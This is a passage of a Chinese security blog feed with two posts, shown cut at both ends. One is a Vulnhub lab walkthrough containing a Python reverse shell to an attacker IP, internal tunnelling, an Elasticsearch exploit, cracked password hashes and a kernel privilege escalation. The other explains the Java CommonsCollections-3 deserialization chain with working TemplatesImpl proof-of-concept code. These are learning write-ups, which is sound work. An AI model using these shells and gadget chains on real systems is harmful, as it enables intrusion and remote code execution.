- sV 来探测服务和版本信息</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710211750675.png\" alt=\"image-20230710211750675\" /></p>\n<p>这里可以看到这里的 22 端口上就是一个 ssh，且是一个乌班图系统，5000 端口是一个 http 服务，且环境是 python，python 版本是 2.7</p>\n<p>这里尝试去访问一下这个 5000 端口，看一下上面运行的一个具体业务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710212221997.png\" alt=\"image-20230710212221997\" /></p>\n<p>这里测试了一下，发现会将用户的输入都展示到页面上，首先我是怀疑有模版注入，毕竟 python 回显，属于做 ctf 触发关键词了，但是发现并没有经过渲染</p>\n<p>这里还处于信息收集的阶段，扫描目录是必不可少的，这里是使用 dirsearch 工具进行一个扫描</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710212726917.png\" alt=\"image-20230710212726917\" /></p>\n<p>这里也是发现了又一个 admin 路由可以访问，这里去访问一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710212917421.png\" alt=\"image-20230710212917421\" /></p>\n<p>这里看到这里是一个管理页面，这里是一个代码执行，这里尝试去用 python 反弹一个 shell</p>\n<pre><code class=\"language-python\">import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((&quot;192.168.10.129&quot;,4444));\nos.dup2(s.fileno(),0); \nos.dup2(s.fileno(),1); \nos.dup2(s.fileno(),2);\np=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\n</code></pre>\n<p>在 kali 这里监听这个 4444 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711074337267.png\" alt=\"image-20230711074337267\" /></p>\n<p>运行这段代码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711074420640.png\" alt=\"image-20230711074420640\" /></p>\n<p>这里已经拿到了这个 shell，但是这里可以看到，桌面这里有一个 Dockerfile 文件，这里可能只是在容器内，这里可以通过两个命令去判断一下是不是 docker 容器</p>\n<pre><code class=\"language-perl\">ls -a / |grep &quot;.docker*&quot;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711075452457.png\" alt=\"image-20230711075452457\" /></p>\n<pre><code class=\"language-perl\">cat /proc/1/cgroup\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711075656444.png\" alt=\"image-20230711075656444\" /></p>\n<p>这二者都存在的话就可以确定这里拿到的 shell 是 docker 容器中的 shell。</p>\n<h3 id=\"内网信息收集\"><a class=\"anchor\" href=\"#内网信息收集\">#</a> 内网信息收集</h3>\n<p>这里他是在 docker 中，我们可以将其视为内网的主机，这里可以看一下 ip 来进行一个常规的探测</p>\n<p>先看一下拿到 shell 的这个 docker 的 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711081457617.png\" alt=\"image-20230711081457617\" /></p>\n<p>可以看到这里的 ip 地址是 172.17.0.3，16 位，这里同网段下的 ip 很多，这里用 shell 脚本去探测</p>\n<pre><code class=\"language-shell\">for i in $(seq 0 255); do\n    for j in $(seq 1 254); do\n        ping -c 1 172.17.$i.$j\n    done\ndone\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711085009954.png\" alt=\"image-20230711085009954\" /></p>\n<p>这里可以看到 172.17.0.1，172.17.0.2，172.17.0.3（自身）是存活的，这里接下来就收集一下这三台主机的端口，这里 172 是内网网段想要使用 kali 的工具首先需要做内网穿透来建立一个通道</p>\n<h3 id=\"内网穿透\"><a class=\"anchor\" href=\"#内网穿透\">#</a> 内网穿透</h3>\n<p>这里我用的是 Venom<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0RsaXYzL1Zlbm9tL3JlbGVhc2VzL3RhZy92MS4xLjA=\">Release Venom v1.1.0 · Dliv3/Venom (github.com)</span> 这个工具，这里首先我再 kali 运行服务端 admin 文件监听 9999 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711090850888.png\" alt=\"image-20230711090850888\" /></p>\n<p>接着再 kali 上开启一个 http 服务将客户端传送给靶机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091015534.png\" alt=\"image-20230711091015534\" /></p>\n<p>接着在靶机上使用 wget 来将客户端 down 下来</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091514408.png\" alt=\"image-20230711091514408\" /></p>\n<p>这里运行去连接服务端，注意：这里要给与一个执行权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091840340.png\" alt=\"image-20230711091840340\" /></p>\n<p>这样就成功的与服务端建立了连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711091943160.png\" alt=\"image-20230711091943160\" /></p>\n<p>这里进入到这个节点后启动一个 socks 监听 8888 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093204818.png\" alt=\"image-20230711093204818\" /></p>\n<p>这里去更改配置文件 sudo vim /etc/proxychains4.conf</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093145434.png\" alt=\"image-20230711093145434\" /></p>\n<h3 id=\"漏洞利用elasticsearch\"><a class=\"anchor\" href=\"#漏洞利用elasticsearch\">#</a> 漏洞利用 Elasticsearch</h3>\n<p>这样就可以开对内网进行扫描了</p>\n<pre><code class=\"language-perl\">proxychains nmap -Pn -sT 172.17.0.1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093453070.png\" alt=\"image-20230711093453070\" /></p>\n<p>这里扫描完成，发现开启的端口也是 22 和 5000，这里也是扫描了一下另一台主机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711095509435.png\" alt=\"image-20230711095509435\" /></p>\n<p>发现这里只有 5000 端口，这里再通过 nmap 进行一个服务的发现</p>\n<pre><code class=\"language-perl\">proxychains nmap -p22,5000 -Pn -sT -sV 172.17.0.1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711093821859.png\" alt=\"image-20230711093821859\" /></p>\n<p>这里再浏览器上挂上代理，然后去尝试访问一下扫描到的服务，这里可以看到，这台主机和已经拿到 shell 的主机上面服务是一样的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711095021961.png\" alt=\"image-20230711095021961\" /></p>\n<p>对 9200 端口进行一个服务发现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711095657154.png\" alt=\"image-20230711095657154\" /></p>\n<p>这里上面是开启了一个 Elasticsearch 服务，版本是 1.4.2，这里也是去网上查询了一下<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODAyMjU4\"> Elasticsearch 漏洞总结 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span>，这里历史版本漏洞还是比较多的，也可以直接使用 searchsploit 来查找历史漏洞</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711103506477.png\" alt=\"image-20230711103506477\" /></p>\n<p>这里还附带了 exp，这里分别 copy 过来尝试一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104103616.png\" alt=\"image-20230711104103616\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104249462.png\" alt=\"image-20230711104249462\" /></p>\n<p>可以看到这里也是拿到了一个 shell，当然了这里拿到的还是一个 docker 容器的权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104449777.png\" alt=\"image-20230711104449777\" /></p>\n<p>但是在其根目录发现了一个 passwords 的文件，这里去查看一下这个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104624747.png\" alt=\"image-20230711104624747\" /></p>\n<p>可以看到其中存放了用户名和密码，当然这里的密码很显然不是明文存放，这里通过在线网站对哈希进行一个碰撞，这里我碰撞的是这个 admin 的值</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711104851103.png\" alt=\"image-20230711104851103\" /></p>\n<p>这里对所有的文件都进行碰撞，很幸运的是都拿到了结果</p>\n<pre><code class=\"language-perl\">john:3f8184a7343664553fcb5337a3138814 \t\t1337hack\ntest:861f194e9d6118f3d942a72be3e51749\t\t1234test\nadmin:670c3bbc209a18dde5446e5e6c1f1d5b\t\t1111pass\nroot:b3d34352fc26117979deabdf1b9b6354\t\t1234pass\njane:5c158b60ed97c723b673529b8a3cf72b\t\t1234jane\n</code></pre>\n<p>这里拿到账号密码，尝试去登录靶机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711105556646.png\" alt=\"image-20230711105556646\" /></p>\n<p>这里用第一组账号密码就可以通过 ssh 连接上，但是经过尝试只有这个账号能够登录上</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711105752762.png\" alt=\"image-20230711105752762\" /></p>\n<p>这里进行尝试没有 sudo，所以这里还需要提权</p>\n<h3 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711105916576.png\" alt=\"image-20230711105916576\" /></p>\n<p>在 ssh 连接上的时候可以发现这里的内核版本是 3.13, 这里还是用 searchsploit 找一下</p>\n<pre><code class=\"language-perl\">searchsploit ubuntu 3.13.0\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711110123363.png\" alt=\"image-20230711110123363\" /></p>\n<p>这里尝试第一个，cp 到当前目录后，这里因为是 c 源码文件所以要使用 gcc 编译一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711110752376.png\" alt=\"image-20230711110752376\" /></p>\n<p>值得注意的是源码中有这样一行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711111430353.png\" alt=\"image-20230711111430353\" /></p>\n<p>在这里它又去通过 gcc 想去编译一个 c 语言的库文件，但是目标靶机经过查看是没有安装 gcc 的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711111639937.png\" alt=\"image-20230711111639937\" /></p>\n<p>所以这里就算是我再 kali 上编译好了它也不能直接在目标靶机上运行，这里就需要修改源码，最简单的思路就是将这个库文件一起打包，让源码直接调用这个库文件，而不在编译</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711112209565.png\" alt=\"image-20230711112209565\" /></p>\n<p>这里可以看到我将原有的编译库文件的部分删除，只保留打开文件利用的部分，修改后通过 gcc 编译</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711112404436.png\" alt=\"image-20230711112404436\" /></p>\n<p>这里有报错但是不用管，是能够编译成功的，接着在 kali 上寻找一下缺少的库文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711112750984.png\" alt=\"image-20230711112750984\" /></p>\n<p>这里找到这个文件后将这个文件移动到当前目录，然后还是通过 python 开启一个 http 服务，让目标靶机下载这两个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711113045641.png\" alt=\"image-20230711113045641\" /></p>\n<p>下载成功后将两个文件都移动到 tmp 目录下，并且给 exp 一个可执行权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230711120913465.png\" alt=\"image-20230711120913465\" /></p>\n<p>齐活</p>\n",
            "tags": [
                "Vulnhub",
                "Vulnhub"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/10/CommonsCollections-3/",
            "url": "https://blog.xcu.icu/2023/07/10/CommonsCollections-3/",
            "title": "ConmonsCollection-3",
            "date_published": "2023-07-09T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>最近考试，线下赛，学校留校事宜，一直没有时间更新，这里先更新一下 CC3 的学习，<br />\n前两篇已经记录了 CC1 和突破 CC1 版本限制的 CC6，这篇记录一下 CC3 的学习，本篇中所涉及的代码都在 https://github.com/clown-q/Clown_java 中</p>\n<h2 id=\"commonscollection-3\"><a class=\"anchor\" href=\"#commonscollection-3\">#</a> CommonsCollection-3</h2>\n<p>这条链子使用了与前面两条链子中不同的命令执行的方式，前面的两篇中的 CC1 和 CC6 的链子都是直接命令调用，在 CC3 这个链子中使用了动态类加载，相当于这里是代码执行，前面是命令执行</p>\n<h3 id=\"类加载\"><a class=\"anchor\" href=\"#类加载\">#</a> 类加载</h3>\n<p>这里先记录一下类加载，关于类加载实际上是很大的一块内容，后面会新开一篇文章来记录，前面也有提到过类加载机制但是只是简单的记录了一下类加载的逻辑指向，这里先简单的记录等会用得上的部分：</p>\n<p>类加载的过程中，现在方法区上面找到 class 信息，有的话直接调用，没有找到就使用类加载器加载到方法区，静态代码在类加载的时候自动执行，这里就和 java 反序列化的过程中 readObject 自动调用很像，做一个区分的话就是在初始化的时候静态代码块会自动调用，其他的在实例化的时候调用， <code>在使用forName的时候默认是进行初始化的</code></p>\n<h4 id=\"静态类加载demo\"><a class=\"anchor\" href=\"#静态类加载demo\">#</a> 静态类加载 demo</h4>\n<p>眼见为实，下面测试一下，先写一个用于测试的目标类</p>\n<pre><code class=\"language-java\">package CommonsCollection.Clown_CC3;\n\n\npublic class ClassLoader_Person&#123;\n    public String name;\n    public static int age;\n\n    static &#123;\n        System.out.println(&quot;静态代码块&quot;);\n    &#125;\n\n    &#123;\n        System.out.println(&quot;代码块&quot;);\n    &#125;\n\n    public static void test()&#123;\n        System.out.println(&quot;静态方法&quot;);\n    &#125;\n\n    public ClassLoader_Person()&#123;\n        System.out.println(&quot;无参的构造函数&quot;);\n    &#125;\n\n    public ClassLoader_Person(String name, int age)&#123;\n        System.out.println(&quot;有参的构造方法&quot;);\n    &#125;\n&#125;\n</code></pre>\n<p>在 new 一个类的时候</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191733187.png\" alt=\"image-20230519173348127\" /></p>\n<p>这里没有添加参数所以调用的是无参的构造函数，两种代码块都调用了，当调用一个具体的方法的时候</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191736179.png\" alt=\"image-20230519173613149\" /></p>\n<p>这里构造方法和非静态代码块就不会调用了，当设置一个静态变量的时候，只会调用静态代码块</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191739606.png\" alt=\"image-20230519173924573\" /></p>\n<p>通过上面的 demo，很容易看出，实际上在 java 初始化的时候就会调用静态代码块，其他的则是在类和对象实例化的时候调用</p>\n<h4 id=\"动态类加载demo\"><a class=\"anchor\" href=\"#动态类加载demo\">#</a> 动态类加载 demo</h4>\n<p>这里加载的还是上面用的 Person 类</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191744225.png\" alt=\"image-20230519174440189\" /></p>\n<p>这里使用 forName 的时候也是默认调用静态代码块</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191746502.png\" alt=\"image-20230519174604465\" /></p>\n<p>forName 这个重载的方法有参数可以设置为不初始化</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191748642.png\" alt=\"image-20230519174815600\" /></p>\n<p>这里通过 newInstance 实例化就可以继续正常加载了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191749778.png\" alt=\"image-20230519174959724\" /></p>\n<p>下面接着测试 LoadClass 进行类加载</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305191837349.png\" alt=\"image-20230519183741289\" /></p>\n<p>这里可以看到在 loadclass 时是没有调用的</p>\n<h4 id=\"urlclassloader\"><a class=\"anchor\" href=\"#urlclassloader\">#</a> URLClassLoader</h4>\n<p>其中默认类加载器的继承关系</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201148169.png\" alt=\"image-20230520114825127\" /></p>\n<p>这里的 URLClassLoader 方法是 AppClassLoader 的父类，所以 URLClassLoader 的工作流程也是默认的类加载器的工作流程</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201159335.png\" alt=\"image-20230520115927300\" /></p>\n<p>URLClassLoader 中传入一个 URL，从 URL 中加载出目标类，也就是说可以通过 urlClassLoader 实现任意类加载</p>\n<pre><code class=\"language-java\">package CommonsCollection.Clown_CC3;\n\n\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class ClassLoaderTest &#123;\n    public static void main(String[] args) throws Exception&#123;\n        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file:///D:\\\\tmp\\\\&quot;)&#125;);\n        Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Test&quot;);\n        c.newInstance();\n    &#125;\n&#125;\n</code></pre>\n<p>这里通过 file 协议加载的 TEst 文件的作用就是弹出计算器</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201321174.png\" alt=\"image-20230520132151122\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201322363.png\" alt=\"image-20230520132226319\" /></p>\n<p>同样这里也可以使用 http 协议利用更加方便，这种命令执行的方式更加灵活</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201324754.png\" alt=\"image-20230520132413708\" /></p>\n<h4 id=\"defineclass\"><a class=\"anchor\" href=\"#defineclass\">#</a> defineClass</h4>\n<p>上面介绍了通过 URLClassLoader 方法实现任意方法执行，这里在介绍一下 defineClass，上面的使用 http 协议虽然运用灵活，但是在实际利用中需要出网，而在 define 中这里只需要加载字节码不需要出网就可以利用</p>\n<p>在上面的流程中实际上</p>\n<pre class=\"mermaid graph\"><svg id=\"mermaid-1689595120972\" width=\"100%\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" height=\"55\" style=\"max-width: 664.640625px;\" viewBox=\"0 0 664.640625 55\"><g><g class=\"output\"><g class=\"clusters\"></g><g class=\"edgePaths\"><g class=\"edgePath LS-A LE-B\" id=\"L-A-B\" style=\"opacity: 1;\"><path class=\"path\" d=\"M185.625,27.5L210.625,27.5L235.625,27.5\" marker-end=\"url(#arrowhead12)\" style=\"fill:none\"></path><defs><marker id=\"arrowhead12\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerUnits=\"strokeWidth\" markerWidth=\"8\" markerHeight=\"6\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowheadPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker></defs></g><g class=\"edgePath LS-B LE-C\" id=\"L-B-C\" style=\"opacity: 1;\"><path class=\"path\" d=\"M412.40625,27.5L437.40625,27.5L462.40625,27.5\" marker-end=\"url(#arrowhead13)\" style=\"fill:none\"></path><defs><marker id=\"arrowhead13\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerUnits=\"strokeWidth\" markerWidth=\"8\" markerHeight=\"6\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowheadPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker></defs></g></g><g class=\"edgeLabels\"><g class=\"edgeLabel\" transform=\"\" style=\"opacity: 1;\"><g transform=\"translate(0,0)\" class=\"label\"><rect rx=\"0\" ry=\"0\" width=\"0\" height=\"0\"></rect><text><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\"></tspan></text></g></g><g class=\"edgeLabel\" transform=\"\" style=\"opacity: 1;\"><g transform=\"translate(0,0)\" class=\"label\"><rect rx=\"0\" ry=\"0\" width=\"0\" height=\"0\"></rect><text><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\"></tspan></text></g></g></g><g class=\"nodes\"><g class=\"node default\" id=\"flowchart-A-4\" transform=\"translate(96.8125,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-88.8125\" y=\"-19.5\" width=\"177.625\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-78.8125,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">ClassLoader#loadclass</tspan></text></g></g></g><g class=\"node default\" id=\"flowchart-B-5\" transform=\"translate(324.015625,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-88.390625\" y=\"-19.5\" width=\"176.78125\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-78.390625,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">ClassLoader#findClass</tspan></text></g></g></g><g class=\"node default\" id=\"flowchart-C-7\" transform=\"translate(559.5234375,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-97.1171875\" y=\"-19.5\" width=\"194.234375\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-87.1171875,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">ClassLoader#defineClass</tspan></text></g></g></g></g></g></g></svg></pre><ul>\n<li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行</li>\n<li>findClass findClass 的作用是根据基础 URL 指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar 包或远程 http 服务器上读取字节码，然后交给 defineClass</li>\n<li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的 Java 类</li>\n</ul>\n<p>这里实际上就是直接去调用 define 来进行代码执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201438815.png\" alt=\"image-20230520143858761\" /></p>\n<pre><code class=\"language-java\">package CommonsCollection.Clown_CC3;\n\n\nimport java.lang.reflect.Method;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class defineClassTest &#123;\n    public static void main(String[] args) throws Exception&#123;\n        ClassLoader classLoader =ClassLoader.getSystemClassLoader();\n        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);\n        defineClass.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\tmp\\\\Test.class&quot;));\n        Class test = (Class) defineClass.invoke(classLoader, &quot;Test&quot;, code, 0, code.length);\n        test.newInstance();\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305201439456.png\" alt=\"image-20230520143930404\" /></p>\n<h2 id=\"cc3链子分析\"><a class=\"anchor\" href=\"#cc3链子分析\">#</a> CC3 链子分析</h2>\n<p>前面也提到 CC3 使用类加载进行代码执行，这里 CC3 作者也是使用 defineClass 这个方法去进行代码执行</p>\n<h3 id=\"代码执行逻辑分析\"><a class=\"anchor\" href=\"#代码执行逻辑分析\">#</a> 代码执行逻辑分析</h3>\n<p>最后想要利用到的点是 defineClass</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710082241036.png\" alt=\"image-20230710082241036\" /></p>\n<p>但是这里是一个被 protected 修饰的方法，只能对于本包和其子类可见，虽然大部分的上层开发者不会使用到 defineClass 方法，但是还是有一些底层的类使用到了它，这就是 TemplatesImpl，这里可以通过 Alt+F7 去查找有哪些地方调用了这个 defineClass 方法，最后也是找到在 TemplatesImpl 类中有一个调用，没有显式地声明其定义域。Java 中默认情况下，如果一个 方法没有显式声明作用域，其作用域为 default。所以也就是说这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710084307534.png\" alt=\"image-20230710084307534\" /></p>\n<p>这里接着找哪里调用了它</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710085207571.png\" alt=\"image-20230710085207571\" /></p>\n<p>可以看到这里是在 defineTransletClasses 中有一个调用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710085433761.png\" alt=\"image-20230710085433761\" /></p>\n<p>这里看到，它也是一个私有的方法，这里接着追溯一下哪里有调用这个方法</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710085646563.png\" alt=\"image-20230710085646563\" /></p>\n<p>这里一共也是找到了三处调用，这里分别看一下几处调用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710090742178.png\" alt=\"image-20230710090742178\" /></p>\n<p>这里是直接将 class 返回回来</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710090947197.png\" alt=\"image-20230710090947197\" /></p>\n<p>这里返回了一个下标</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710091144929.png\" alt=\"image-20230710091144929\" /></p>\n<p>这里有一个 newInstance 方法会进行一个初始化，代码执行的两个条件类加载和初始化就满足了，但是这个方法也是私有的，所以这里还需要往回找</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710091832347.png\" alt=\"image-20230710091832347\" /></p>\n<p>最后是找到 newTransformer 中调用，且是一个公共的方法，这里找到这就基本可以代码执行了，总结一下流程大概就下面这个样子</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710093731368.png\" alt=\"image-20230710093731368\" /></p>\n<h3 id=\"demo\"><a class=\"anchor\" href=\"#demo\">#</a> demo</h3>\n<p>上面吧整个流程整理清楚了，下面开始构造一个简单的 poc 来执行任意代码</p>\n<p>这里先构造要加载的字节码，值得注意的是 TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类，但是为什么呢，这里可以先构造一个不继承的调试看一下</p>\n<pre><code class=\"language-Java\">package CommonsCollection.Clown_CC3;\n\nimport java.io.IOException;\n\n/**\n * @BelongsProject: study_java\n * @BelongsPackage: CommonsCollection.Clown_CC3\n * @Author: Clown\n * @CreateTime: 2023-07-10  10:00\n */\npublic class Test &#123;\n    static &#123;\n        try &#123;\n            Runtime.getRuntime().exec(&quot;calc&quot;);\n        &#125; catch (IOException e) &#123;\n            throw new RuntimeException(e);\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p>先构造一个这样的代码，来通过 TemplatesImpl 方法来执行</p>\n<pre><code class=\"language-Java\">package CommonsCollection.Clown_CC3;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class POC1 &#123;\n    public static void Serliazation(Object object) throws Exception&#123;\n        FileOutputStream fileInputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;Output&quot;);\n    &#125;\n\n    public static void Unserlization() throws Exception&#123;\n        FileInputStream fileInputStream =new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;Input&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        TemplatesImpl templates = new TemplatesImpl();\n        Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();\n        Field name = aClass.getDeclaredField(&quot;_name&quot;);\n        name.setAccessible(true);\n        name.set(templates,&quot;aaaa&quot;);\n\n        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodes.setAccessible(true);\n        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\study_java\\\\test\\\\Test.class&quot;));\n        byte[][] codes = &#123;code&#125;;\n        bytecodes.set(templates,codes);\n\n        Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);\n        tfactory.setAccessible(true);\n        tfactory.set(templates,new TransformerFactoryImpl());\n        \n        templates.newTransformer();\n    